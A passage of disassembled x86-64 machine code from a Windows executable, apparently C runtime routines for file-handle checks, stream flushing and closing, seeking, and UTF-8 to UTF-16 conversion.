   14000b096:	4c 8d 05 53 e1 00 00 	lea    0xe153(%rip),%r8        # 0x1400191f0
   14000b09d:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   14000b0a1:	48 c1 e8 20          	shr    $0x20,%rax
   14000b0a5:	85 c0                	test   %eax,%eax
   14000b0a7:	75 5d                	jne    0x14000b106
   14000b0a9:	8b 45 e0             	mov    -0x20(%rbp),%eax
   14000b0ac:	85 c0                	test   %eax,%eax
   14000b0ae:	74 2c                	je     0x14000b0dc
   14000b0b0:	83 f8 05             	cmp    $0x5,%eax
   14000b0b3:	75 17                	jne    0x14000b0cc
   14000b0b5:	c6 43 30 01          	movb   $0x1,0x30(%rbx)
   14000b0b9:	c7 43 2c 09 00 00 00 	movl   $0x9,0x2c(%rbx)
   14000b0c0:	c6 43 38 01          	movb   $0x1,0x38(%rbx)
   14000b0c4:	89 43 34             	mov    %eax,0x34(%rbx)
   14000b0c7:	e9 a3 fd ff ff       	jmp    0x14000ae6f
   14000b0cc:	8b 4d e0             	mov    -0x20(%rbp),%ecx
   14000b0cf:	48 8b d3             	mov    %rbx,%rdx
   14000b0d2:	e8 79 b4 ff ff       	call   0x140006550
   14000b0d7:	e9 93 fd ff ff       	jmp    0x14000ae6f
   14000b0dc:	49 8b 04 d0          	mov    (%r8,%rdx,8),%rax
   14000b0e0:	42 f6 44 e8 38 40    	testb  $0x40,0x38(%rax,%r13,8)
   14000b0e6:	74 06                	je     0x14000b0ee
   14000b0e8:	41 80 3e 1a          	cmpb   $0x1a,(%r14)
   14000b0ec:	74 1f                	je     0x14000b10d
   14000b0ee:	83 63 34 00          	andl   $0x0,0x34(%rbx)
   14000b0f2:	c6 43 30 01          	movb   $0x1,0x30(%rbx)
   14000b0f6:	c7 43 2c 1c 00 00 00 	movl   $0x1c,0x2c(%rbx)
   14000b0fd:	c6 43 38 01          	movb   $0x1,0x38(%rbx)
   14000b101:	e9 69 fd ff ff       	jmp    0x14000ae6f
   14000b106:	8b 45 e4             	mov    -0x1c(%rbp),%eax
   14000b109:	2b c7                	sub    %edi,%eax
   14000b10b:	eb 02                	jmp    0x14000b10f
   14000b10d:	33 c0                	xor    %eax,%eax
   14000b10f:	48 83 c4 68          	add    $0x68,%rsp
   14000b113:	41 5f                	pop    %r15
   14000b115:	41 5e                	pop    %r14
   14000b117:	41 5d                	pop    %r13
   14000b119:	41 5c                	pop    %r12
   14000b11b:	5f                   	pop    %rdi
   14000b11c:	5e                   	pop    %rsi
   14000b11d:	5b                   	pop    %rbx
   14000b11e:	5d                   	pop    %rbp
   14000b11f:	c3                   	ret
   14000b120:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   14000b125:	57                   	push   %rdi
   14000b126:	48 83 ec 30          	sub    $0x30,%rsp
   14000b12a:	83 64 24 20 00       	andl   $0x0,0x20(%rsp)
   14000b12f:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000b134:	e8 af c8 ff ff       	call   0x1400079e8
   14000b139:	90                   	nop
   14000b13a:	bb 03 00 00 00       	mov    $0x3,%ebx
   14000b13f:	89 5c 24 24          	mov    %ebx,0x24(%rsp)
   14000b143:	3b 1d 7f e6 00 00    	cmp    0xe67f(%rip),%ebx        # 0x1400197c8
   14000b149:	74 6d                	je     0x14000b1b8
   14000b14b:	48 63 fb             	movslq %ebx,%rdi
   14000b14e:	48 8b 05 7b e6 00 00 	mov    0xe67b(%rip),%rax        # 0x1400197d0
   14000b155:	48 8b 0c f8          	mov    (%rax,%rdi,8),%rcx
   14000b159:	48 85 c9             	test   %rcx,%rcx
   14000b15c:	75 02                	jne    0x14000b160
   14000b15e:	eb 54                	jmp    0x14000b1b4
   14000b160:	8b 41 14             	mov    0x14(%rcx),%eax
   14000b163:	c1 e8 0d             	shr    $0xd,%eax
   14000b166:	24 01                	and    $0x1,%al
   14000b168:	74 19                	je     0x14000b183
   14000b16a:	48 8b 0d 5f e6 00 00 	mov    0xe65f(%rip),%rcx        # 0x1400197d0
   14000b171:	48 8b 0c f9          	mov    (%rcx,%rdi,8),%rcx
   14000b175:	e8 0a 05 00 00       	call   0x14000b684
   14000b17a:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000b17d:	74 04                	je     0x14000b183
   14000b17f:	ff 44 24 20          	incl   0x20(%rsp)
   14000b183:	48 8b 05 46 e6 00 00 	mov    0xe646(%rip),%rax        # 0x1400197d0
   14000b18a:	48 8b 0c f8          	mov    (%rax,%rdi,8),%rcx
   14000b18e:	48 83 c1 30          	add    $0x30,%rcx
   14000b192:	ff 15 18 2f 00 00    	call   *0x2f18(%rip)        # 0x14000e0b0
   14000b198:	48 8b 0d 31 e6 00 00 	mov    0xe631(%rip),%rcx        # 0x1400197d0
   14000b19f:	48 8b 0c f9          	mov    (%rcx,%rdi,8),%rcx
   14000b1a3:	e8 84 b4 ff ff       	call   0x14000662c
   14000b1a8:	48 8b 05 21 e6 00 00 	mov    0xe621(%rip),%rax        # 0x1400197d0
   14000b1af:	48 83 24 f8 00       	andq   $0x0,(%rax,%rdi,8)
   14000b1b4:	ff c3                	inc    %ebx
   14000b1b6:	eb 87                	jmp    0x14000b13f
   14000b1b8:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000b1bd:	e8 7a c8 ff ff       	call   0x140007a3c
   14000b1c2:	8b 44 24 20          	mov    0x20(%rsp),%eax
   14000b1c6:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   14000b1cb:	48 83 c4 30          	add    $0x30,%rsp
   14000b1cf:	5f                   	pop    %rdi
   14000b1d0:	c3                   	ret
   14000b1d1:	cc                   	int3
   14000b1d2:	cc                   	int3
   14000b1d3:	cc                   	int3
   14000b1d4:	40 53                	rex push %rbx
   14000b1d6:	48 83 ec 20          	sub    $0x20,%rsp
   14000b1da:	8b 41 14             	mov    0x14(%rcx),%eax
   14000b1dd:	48 8b d9             	mov    %rcx,%rbx
   14000b1e0:	c1 e8 0d             	shr    $0xd,%eax
   14000b1e3:	a8 01                	test   $0x1,%al
   14000b1e5:	74 27                	je     0x14000b20e
   14000b1e7:	8b 41 14             	mov    0x14(%rcx),%eax
   14000b1ea:	c1 e8 06             	shr    $0x6,%eax
   14000b1ed:	a8 01                	test   $0x1,%al
   14000b1ef:	74 1d                	je     0x14000b20e
   14000b1f1:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   14000b1f5:	e8 32 b4 ff ff       	call   0x14000662c
   14000b1fa:	f0 81 63 14 bf fe ff 	lock andl $0xfffffebf,0x14(%rbx)
   14000b201:	ff 
   14000b202:	33 c0                	xor    %eax,%eax
   14000b204:	48 89 43 08          	mov    %rax,0x8(%rbx)
   14000b208:	48 89 03             	mov    %rax,(%rbx)
   14000b20b:	89 43 10             	mov    %eax,0x10(%rbx)
   14000b20e:	48 83 c4 20          	add    $0x20,%rsp
   14000b212:	5b                   	pop    %rbx
   14000b213:	c3                   	ret
   14000b214:	48 83 ec 28          	sub    $0x28,%rsp
   14000b218:	83 f9 fe             	cmp    $0xfffffffe,%ecx
   14000b21b:	75 0d                	jne    0x14000b22a
   14000b21d:	e8 72 b3 ff ff       	call   0x140006594
   14000b222:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000b228:	eb 42                	jmp    0x14000b26c
   14000b22a:	85 c9                	test   %ecx,%ecx
   14000b22c:	78 2e                	js     0x14000b25c
   14000b22e:	3b 0d bc e3 00 00    	cmp    0xe3bc(%rip),%ecx        # 0x1400195f0
   14000b234:	73 26                	jae    0x14000b25c
   14000b236:	48 63 c9             	movslq %ecx,%rcx
   14000b239:	48 8d 15 b0 df 00 00 	lea    0xdfb0(%rip),%rdx        # 0x1400191f0
   14000b240:	48 8b c1             	mov    %rcx,%rax
   14000b243:	83 e1 3f             	and    $0x3f,%ecx
   14000b246:	48 c1 e8 06          	shr    $0x6,%rax
   14000b24a:	48 8d 0c c9          	lea    (%rcx,%rcx,8),%rcx
   14000b24e:	48 8b 04 c2          	mov    (%rdx,%rax,8),%rax
   14000b252:	0f b6 44 c8 38       	movzbl 0x38(%rax,%rcx,8),%eax
   14000b257:	83 e0 40             	and    $0x40,%eax
   14000b25a:	eb 12                	jmp    0x14000b26e
   14000b25c:	e8 33 b3 ff ff       	call   0x140006594
   14000b261:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000b267:	e8 d0 b0 ff ff       	call   0x14000633c
   14000b26c:	33 c0                	xor    %eax,%eax
   14000b26e:	48 83 c4 28          	add    $0x28,%rsp
   14000b272:	c3                   	ret
   14000b273:	cc                   	int3
   14000b274:	40 53                	rex push %rbx
   14000b276:	48 83 ec 40          	sub    $0x40,%rsp
   14000b27a:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   14000b27f:	48 8b d9             	mov    %rcx,%rbx
   14000b282:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   14000b287:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000b28c:	e8 57 0a 00 00       	call   0x14000bce8
   14000b291:	48 83 f8 04          	cmp    $0x4,%rax
   14000b295:	77 1a                	ja     0x14000b2b1
   14000b297:	8b 54 24 30          	mov    0x30(%rsp),%edx
   14000b29b:	b9 fd ff 00 00       	mov    $0xfffd,%ecx
   14000b2a0:	81 fa ff ff 00 00    	cmp    $0xffff,%edx
   14000b2a6:	0f 47 d1             	cmova  %ecx,%edx
   14000b2a9:	48 85 db             	test   %rbx,%rbx
   14000b2ac:	74 03                	je     0x14000b2b1
   14000b2ae:	66 89 13             	mov    %dx,(%rbx)
   14000b2b1:	48 83 c4 40          	add    $0x40,%rsp
   14000b2b5:	5b                   	pop    %rbx
   14000b2b6:	c3                   	ret
   14000b2b7:	cc                   	int3
   14000b2b8:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   14000b2bd:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   14000b2c2:	57                   	push   %rdi
   14000b2c3:	41 54                	push   %r12
   14000b2c5:	41 55                	push   %r13
   14000b2c7:	41 56                	push   %r14
   14000b2c9:	41 57                	push   %r15
   14000b2cb:	48 83 ec 30          	sub    $0x30,%rsp
   14000b2cf:	48 8b 3a             	mov    (%rdx),%rdi
   14000b2d2:	33 c0                	xor    %eax,%eax
   14000b2d4:	4d 8b e1             	mov    %r9,%r12
   14000b2d7:	49 8b e8             	mov    %r8,%rbp
   14000b2da:	4c 8b fa             	mov    %rdx,%r15
   14000b2dd:	4c 8b f1             	mov    %rcx,%r14
   14000b2e0:	48 85 c9             	test   %rcx,%rcx
   14000b2e3:	0f 84 e7 00 00 00    	je     0x14000b3d0
   14000b2e9:	48 8b d9             	mov    %rcx,%rbx
   14000b2ec:	4d 85 c0             	test   %r8,%r8
   14000b2ef:	0f 84 b0 00 00 00    	je     0x14000b3a5
   14000b2f5:	4c 8b ac 24 80 00 00 	mov    0x80(%rsp),%r13
   14000b2fc:	00 
   14000b2fd:	38 07                	cmp    %al,(%rdi)
   14000b2ff:	75 08                	jne    0x14000b309
   14000b301:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000b307:	eb 1c                	jmp    0x14000b325
   14000b309:	38 47 01             	cmp    %al,0x1(%rdi)
   14000b30c:	75 08                	jne    0x14000b316
   14000b30e:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   14000b314:	eb 0f                	jmp    0x14000b325
   14000b316:	8a 47 02             	mov    0x2(%rdi),%al
   14000b319:	f6 d8                	neg    %al
   14000b31b:	4d 1b c0             	sbb    %r8,%r8
   14000b31e:	49 f7 d8             	neg    %r8
   14000b321:	49 83 c0 03          	add    $0x3,%r8
   14000b325:	4d 8b cc             	mov    %r12,%r9
   14000b328:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   14000b32d:	48 8b d7             	mov    %rdi,%rdx
   14000b330:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   14000b335:	e8 ae 09 00 00       	call   0x14000bce8
   14000b33a:	48 8b d0             	mov    %rax,%rdx
   14000b33d:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000b341:	74 7b                	je     0x14000b3be
   14000b343:	33 c0                	xor    %eax,%eax
   14000b345:	48 85 d2             	test   %rdx,%rdx
   14000b348:	74 6c                	je     0x14000b3b6
   14000b34a:	8b 4c 24 60          	mov    0x60(%rsp),%ecx
   14000b34e:	81 f9 ff ff 00 00    	cmp    $0xffff,%ecx
   14000b354:	76 3b                	jbe    0x14000b391
   14000b356:	48 83 fd 01          	cmp    $0x1,%rbp
   14000b35a:	76 49                	jbe    0x14000b3a5
   14000b35c:	81 c1 00 00 ff ff    	add    $0xffff0000,%ecx
   14000b362:	41 b8 00 d8 00 00    	mov    $0xd800,%r8d
   14000b368:	8b c1                	mov    %ecx,%eax
   14000b36a:	89 4c 24 60          	mov    %ecx,0x60(%rsp)
   14000b36e:	c1 e8 0a             	shr    $0xa,%eax
   14000b371:	48 ff cd             	dec    %rbp
   14000b374:	66 41 0b c0          	or     %r8w,%ax
   14000b378:	66 89 03             	mov    %ax,(%rbx)
   14000b37b:	b8 ff 03 00 00       	mov    $0x3ff,%eax
   14000b380:	66 23 c8             	and    %ax,%cx
   14000b383:	48 83 c3 02          	add    $0x2,%rbx
   14000b387:	b8 00 dc 00 00       	mov    $0xdc00,%eax
   14000b38c:	66 0b c8             	or     %ax,%cx
   14000b38f:	33 c0                	xor    %eax,%eax
   14000b391:	66 89 0b             	mov    %cx,(%rbx)
   14000b394:	48 03 fa             	add    %rdx,%rdi
   14000b397:	48 83 c3 02          	add    $0x2,%rbx
   14000b39b:	48 83 ed 01          	sub    $0x1,%rbp
   14000b39f:	0f 85 58 ff ff ff    	jne    0x14000b2fd
   14000b3a5:	49 2b de             	sub    %r14,%rbx
   14000b3a8:	49 89 3f             	mov    %rdi,(%r15)
   14000b3ab:	48 d1 fb             	sar    $1,%rbx
   14000b3ae:	48 8b c3             	mov    %rbx,%rax
   14000b3b1:	e9 8c 00 00 00       	jmp    0x14000b442
   14000b3b6:	48 8b f8             	mov    %rax,%rdi
   14000b3b9:	66 89 03             	mov    %ax,(%rbx)
   14000b3bc:	eb e7                	jmp    0x14000b3a5
   14000b3be:	49 89 3f             	mov    %rdi,(%r15)
   14000b3c1:	41 c6 45 30 01       	movb   $0x1,0x30(%r13)
   14000b3c6:	41 c7 45 2c 2a 00 00 	movl   $0x2a,0x2c(%r13)
   14000b3cd:	00 
   14000b3ce:	eb 6e                	jmp    0x14000b43e
   14000b3d0:	48 8b ac 24 80 00 00 	mov    0x80(%rsp),%rbp
   14000b3d7:	00 
   14000b3d8:	48 8b d8             	mov    %rax,%rbx
   14000b3db:	38 07                	cmp    %al,(%rdi)
   14000b3dd:	75 08                	jne    0x14000b3e7
   14000b3df:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000b3e5:	eb 1c                	jmp    0x14000b403
   14000b3e7:	38 47 01             	cmp    %al,0x1(%rdi)
   14000b3ea:	75 08                	jne    0x14000b3f4
   14000b3ec:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   14000b3f2:	eb 0f                	jmp    0x14000b403
   14000b3f4:	8a 47 02             	mov    0x2(%rdi),%al
   14000b3f7:	f6 d8                	neg    %al
   14000b3f9:	4d 1b c0             	sbb    %r8,%r8
   14000b3fc:	49 f7 d8             	neg    %r8
   14000b3ff:	49 83 c0 03          	add    $0x3,%r8
   14000b403:	4d 8b cc             	mov    %r12,%r9
   14000b406:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   14000b40b:	48 8b d7             	mov    %rdi,%rdx
   14000b40e:	33 c9                	xor    %ecx,%ecx
   14000b410:	e8 d3 08 00 00       	call   0x14000bce8
   14000b415:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000b419:	74 18                	je     0x14000b433
   14000b41b:	48 85 c0             	test   %rax,%rax
   14000b41e:	74 8e                	je     0x14000b3ae
   14000b420:	48 83 f8 04          	cmp    $0x4,%rax
   14000b424:	75 03                	jne    0x14000b429
   14000b426:	48 ff c3             	inc    %rbx
   14000b429:	48 03 f8             	add    %rax,%rdi
   14000b42c:	48 ff c3             	inc    %rbx
   14000b42f:	33 c0                	xor    %eax,%eax
   14000b431:	eb a8                	jmp    0x14000b3db
   14000b433:	c6 45 30 01          	movb   $0x1,0x30(%rbp)
   14000b437:	c7 45 2c 2a 00 00 00 	movl   $0x2a,0x2c(%rbp)
   14000b43e:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   14000b442:	48 8b 5c 24 68       	mov    0x68(%rsp),%rbx
   14000b447:	48 8b 6c 24 70       	mov    0x70(%rsp),%rbp
   14000b44c:	48 83 c4 30          	add    $0x30,%rsp
   14000b450:	41 5f                	pop    %r15
   14000b452:	41 5e                	pop    %r14
   14000b454:	41 5d                	pop    %r13
   14000b456:	41 5c                	pop    %r12
   14000b458:	5f                   	pop    %rdi
   14000b459:	c3                   	ret
   14000b45a:	cc                   	int3
   14000b45b:	cc                   	int3
   14000b45c:	33 c0                	xor    %eax,%eax
   14000b45e:	38 01                	cmp    %al,(%rcx)
   14000b460:	74 0e                	je     0x14000b470
   14000b462:	48 3b c2             	cmp    %rdx,%rax
   14000b465:	74 09                	je     0x14000b470
   14000b467:	48 ff c0             	inc    %rax
   14000b46a:	80 3c 08 00          	cmpb   $0x0,(%rax,%rcx,1)
   14000b46e:	75 f2                	jne    0x14000b462
   14000b470:	c3                   	ret
   14000b471:	cc                   	int3
   14000b472:	cc                   	int3
   14000b473:	cc                   	int3
   14000b474:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000b479:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000b47e:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000b483:	57                   	push   %rdi
   14000b484:	48 83 ec 30          	sub    $0x30,%rsp
   14000b488:	48 63 f9             	movslq %ecx,%rdi
   14000b48b:	49 8b d9             	mov    %r9,%rbx
   14000b48e:	8b cf                	mov    %edi,%ecx
   14000b490:	41 8b f0             	mov    %r8d,%esi
   14000b493:	48 8b ea             	mov    %rdx,%rbp
   14000b496:	e8 a5 c8 ff ff       	call   0x140007d40
   14000b49b:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000b49f:	75 11                	jne    0x14000b4b2
   14000b4a1:	c6 43 30 01          	movb   $0x1,0x30(%rbx)
   14000b4a5:	c7 43 2c 09 00 00 00 	movl   $0x9,0x2c(%rbx)
   14000b4ac:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   14000b4b0:	eb 56                	jmp    0x14000b508
   14000b4b2:	44 8b ce             	mov    %esi,%r9d
   14000b4b5:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   14000b4ba:	48 8b d5             	mov    %rbp,%rdx
   14000b4bd:	48 8b c8             	mov    %rax,%rcx
   14000b4c0:	ff 15 62 2d 00 00    	call   *0x2d62(%rip)        # 0x14000e228
   14000b4c6:	85 c0                	test   %eax,%eax
   14000b4c8:	75 12                	jne    0x14000b4dc
   14000b4ca:	ff 15 c0 2b 00 00    	call   *0x2bc0(%rip)        # 0x14000e090
   14000b4d0:	8b c8                	mov    %eax,%ecx
   14000b4d2:	48 8b d3             	mov    %rbx,%rdx
   14000b4d5:	e8 76 b0 ff ff       	call   0x140006550
   14000b4da:	eb d0                	jmp    0x14000b4ac
   14000b4dc:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   14000b4e1:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000b4e5:	74 c5                	je     0x14000b4ac
   14000b4e7:	48 8b d7             	mov    %rdi,%rdx
   14000b4ea:	4c 8d 05 ff dc 00 00 	lea    0xdcff(%rip),%r8        # 0x1400191f0
   14000b4f1:	83 e2 3f             	and    $0x3f,%edx
   14000b4f4:	48 8b cf             	mov    %rdi,%rcx
   14000b4f7:	48 c1 f9 06          	sar    $0x6,%rcx
   14000b4fb:	48 8d 14 d2          	lea    (%rdx,%rdx,8),%rdx
   14000b4ff:	49 8b 0c c8          	mov    (%r8,%rcx,8),%rcx
   14000b503:	80 64 d1 38 fd       	andb   $0xfd,0x38(%rcx,%rdx,8)
   14000b508:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   14000b50d:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   14000b512:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   14000b517:	48 83 c4 30          	add    $0x30,%rsp
   14000b51b:	5f                   	pop    %rdi
   14000b51c:	c3                   	ret
   14000b51d:	cc                   	int3
   14000b51e:	cc                   	int3
   14000b51f:	cc                   	int3
   14000b520:	e9 4f ff ff ff       	jmp    0x14000b474
   14000b525:	cc                   	int3
   14000b526:	cc                   	int3
   14000b527:	cc                   	int3
   14000b528:	66 89 4c 24 08       	mov    %cx,0x8(%rsp)
   14000b52d:	48 83 ec 28          	sub    $0x28,%rsp
   14000b531:	e8 8e 09 00 00       	call   0x14000bec4
   14000b536:	85 c0                	test   %eax,%eax
   14000b538:	74 1f                	je     0x14000b559
   14000b53a:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
   14000b53f:	ba 01 00 00 00       	mov    $0x1,%edx
   14000b544:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   14000b549:	e8 e6 09 00 00       	call   0x14000bf34
   14000b54e:	85 c0                	test   %eax,%eax
   14000b550:	74 07                	je     0x14000b559
   14000b552:	0f b7 44 24 30       	movzwl 0x30(%rsp),%eax
   14000b557:	eb 05                	jmp    0x14000b55e
   14000b559:	b8 ff ff 00 00       	mov    $0xffff,%eax
   14000b55e:	48 83 c4 28          	add    $0x28,%rsp
   14000b562:	c3                   	ret
   14000b563:	cc                   	int3
   14000b564:	48 8b c4             	mov    %rsp,%rax
   14000b567:	48 89 58 10          	mov    %rbx,0x10(%rax)
   14000b56b:	48 89 48 08          	mov    %rcx,0x8(%rax)
   14000b56f:	57                   	push   %rdi
   14000b570:	48 83 ec 30          	sub    $0x30,%rsp
   14000b574:	48 8b fa             	mov    %rdx,%rdi
   14000b577:	48 8b d9             	mov    %rcx,%rbx
   14000b57a:	48 85 c9             	test   %rcx,%rcx
   14000b57d:	75 2e                	jne    0x14000b5ad
   14000b57f:	c6 42 30 01          	movb   $0x1,0x30(%rdx)
   14000b583:	c7 42 2c 16 00 00 00 	movl   $0x16,0x2c(%rdx)
   14000b58a:	48 89 50 f0          	mov    %rdx,-0x10(%rax)
   14000b58e:	48 21 48 e8          	and    %rcx,-0x18(%rax)
   14000b592:	45 33 c9             	xor    %r9d,%r9d
   14000b595:	45 33 c0             	xor    %r8d,%r8d
   14000b598:	33 d2                	xor    %edx,%edx
   14000b59a:	e8 cd ac ff ff       	call   0x14000626c
   14000b59f:	83 c8 ff             	or     $0xffffffff,%eax
   14000b5a2:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   14000b5a7:	48 83 c4 30          	add    $0x30,%rsp
   14000b5ab:	5f                   	pop    %rdi
   14000b5ac:	c3                   	ret
   14000b5ad:	8b 41 14             	mov    0x14(%rcx),%eax
   14000b5b0:	c1 e8 0c             	shr    $0xc,%eax
   14000b5b3:	24 01                	and    $0x1,%al
   14000b5b5:	74 07                	je     0x14000b5be
   14000b5b7:	e8 44 0c 00 00       	call   0x14000c200
   14000b5bc:	eb e1                	jmp    0x14000b59f
   14000b5be:	e8 cd e1 ff ff       	call   0x140009790
   14000b5c3:	90                   	nop
   14000b5c4:	48 8b d7             	mov    %rdi,%rdx
   14000b5c7:	48 8b cb             	mov    %rbx,%rcx
   14000b5ca:	e8 11 00 00 00       	call   0x14000b5e0
   14000b5cf:	8b f8                	mov    %eax,%edi
   14000b5d1:	48 8b cb             	mov    %rbx,%rcx
   14000b5d4:	e8 c3 e1 ff ff       	call   0x14000979c
   14000b5d9:	8b c7                	mov    %edi,%eax
   14000b5db:	eb c5                	jmp    0x14000b5a2
   14000b5dd:	cc                   	int3
   14000b5de:	cc                   	int3
   14000b5df:	cc                   	int3
   14000b5e0:	48 8b c4             	mov    %rsp,%rax
   14000b5e3:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000b5e7:	48 89 70 10          	mov    %rsi,0x10(%rax)
   14000b5eb:	57                   	push   %rdi
   14000b5ec:	48 83 ec 30          	sub    $0x30,%rsp
   14000b5f0:	48 8b fa             	mov    %rdx,%rdi
   14000b5f3:	48 8b d9             	mov    %rcx,%rbx
   14000b5f6:	48 85 c9             	test   %rcx,%rcx
   14000b5f9:	75 25                	jne    0x14000b620
   14000b5fb:	48 89 50 f0          	mov    %rdx,-0x10(%rax)
   14000b5ff:	45 33 c9             	xor    %r9d,%r9d
   14000b602:	48 21 48 e8          	and    %rcx,-0x18(%rax)
   14000b606:	45 33 c0             	xor    %r8d,%r8d
   14000b609:	c6 42 30 01          	movb   $0x1,0x30(%rdx)
   14000b60d:	c7 42 2c 16 00 00 00 	movl   $0x16,0x2c(%rdx)
   14000b614:	33 d2                	xor    %edx,%edx
   14000b616:	e8 51 ac ff ff       	call   0x14000626c
   14000b61b:	83 c8 ff             	or     $0xffffffff,%eax
   14000b61e:	eb 54                	jmp    0x14000b674
   14000b620:	8b 41 14             	mov    0x14(%rcx),%eax
   14000b623:	83 ce ff             	or     $0xffffffff,%esi
   14000b626:	c1 e8 0d             	shr    $0xd,%eax
   14000b629:	a8 01                	test   $0x1,%al
   14000b62b:	74 3d                	je     0x14000b66a
   14000b62d:	e8 7a de ff ff       	call   0x1400094ac
   14000b632:	48 8b cb             	mov    %rbx,%rcx
   14000b635:	8b f0                	mov    %eax,%esi
   14000b637:	e8 98 fb ff ff       	call   0x14000b1d4
   14000b63c:	48 8b cb             	mov    %rbx,%rcx
   14000b63f:	e8 b4 e3 ff ff       	call   0x1400099f8
   14000b644:	8b c8                	mov    %eax,%ecx
   14000b646:	48 8b d7             	mov    %rdi,%rdx
   14000b649:	e8 1e 0a 00 00       	call   0x14000c06c
   14000b64e:	85 c0                	test   %eax,%eax
   14000b650:	79 05                	jns    0x14000b657
   14000b652:	83 ce ff             	or     $0xffffffff,%esi
   14000b655:	eb 13                	jmp    0x14000b66a
   14000b657:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   14000b65b:	48 85 c9             	test   %rcx,%rcx
   14000b65e:	74 0a                	je     0x14000b66a
   14000b660:	e8 c7 af ff ff       	call   0x14000662c
   14000b665:	48 83 63 28 00       	andq   $0x0,0x28(%rbx)
   14000b66a:	48 8b cb             	mov    %rbx,%rcx
   14000b66d:	e8 8e 0b 00 00       	call   0x14000c200
   14000b672:	8b c6                	mov    %esi,%eax
   14000b674:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   14000b679:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   14000b67e:	48 83 c4 30          	add    $0x30,%rsp
   14000b682:	5f                   	pop    %rdi
   14000b683:	c3                   	ret
   14000b684:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000b689:	48 89 7c 24 10       	mov    %rdi,0x10(%rsp)
   14000b68e:	55                   	push   %rbp
   14000b68f:	48 8b ec             	mov    %rsp,%rbp
   14000b692:	48 83 ec 60          	sub    $0x60,%rsp
   14000b696:	48 83 65 c0 00       	andq   $0x0,-0x40(%rbp)
   14000b69b:	83 3d 72 d8 00 00 00 	cmpl   $0x0,0xd872(%rip)        # 0x140018f14
   14000b6a2:	c6 45 d0 00          	movb   $0x0,-0x30(%rbp)
   14000b6a6:	c6 45 e8 00          	movb   $0x0,-0x18(%rbp)
   14000b6aa:	c6 45 f0 00          	movb   $0x0,-0x10(%rbp)
   14000b6ae:	c6 45 f8 00          	movb   $0x0,-0x8(%rbp)
   14000b6b2:	75 10                	jne    0x14000b6c4
   14000b6b4:	0f 10 05 9d d0 00 00 	movups 0xd09d(%rip),%xmm0        # 0x140018758
   14000b6bb:	c6 45 e8 01          	movb   $0x1,-0x18(%rbp)
   14000b6bf:	f3 0f 7f 45 d8       	movdqu %xmm0,-0x28(%rbp)
   14000b6c4:	48 8d 55 c0          	lea    -0x40(%rbp),%rdx
   14000b6c8:	e8 97 fe ff ff       	call   0x14000b564
   14000b6cd:	80 7d e8 02          	cmpb   $0x2,-0x18(%rbp)
   14000b6d1:	8b f8                	mov    %eax,%edi
   14000b6d3:	75 0b                	jne    0x14000b6e0
   14000b6d5:	48 8b 4d c0          	mov    -0x40(%rbp),%rcx
   14000b6d9:	83 a1 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rcx)
   14000b6e0:	80 7d f0 00          	cmpb   $0x0,-0x10(%rbp)
   14000b6e4:	74 0f                	je     0x14000b6f5
   14000b6e6:	8b 5d ec             	mov    -0x14(%rbp),%ebx
   14000b6e9:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   14000b6ed:	e8 3e a0 ff ff       	call   0x140005730
   14000b6f2:	89 58 20             	mov    %ebx,0x20(%rax)
   14000b6f5:	80 7d f8 00          	cmpb   $0x0,-0x8(%rbp)
   14000b6f9:	74 0f                	je     0x14000b70a
   14000b6fb:	8b 5d f4             	mov    -0xc(%rbp),%ebx
   14000b6fe:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   14000b702:	e8 29 a0 ff ff       	call   0x140005730
   14000b707:	89 58 24             	mov    %ebx,0x24(%rax)
   14000b70a:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   14000b70f:	8b c7                	mov    %edi,%eax
   14000b711:	48 8b 7c 24 78       	mov    0x78(%rsp),%rdi
   14000b716:	48 83 c4 60          	add    $0x60,%rsp
   14000b71a:	5d                   	pop    %rbp
   14000b71b:	c3                   	ret
   14000b71c:	cc                   	int3
   14000b71d:	cc                   	int3
   14000b71e:	cc                   	int3
   14000b71f:	cc                   	int3
   14000b720:	48 83 ec 58          	sub    $0x58,%rsp
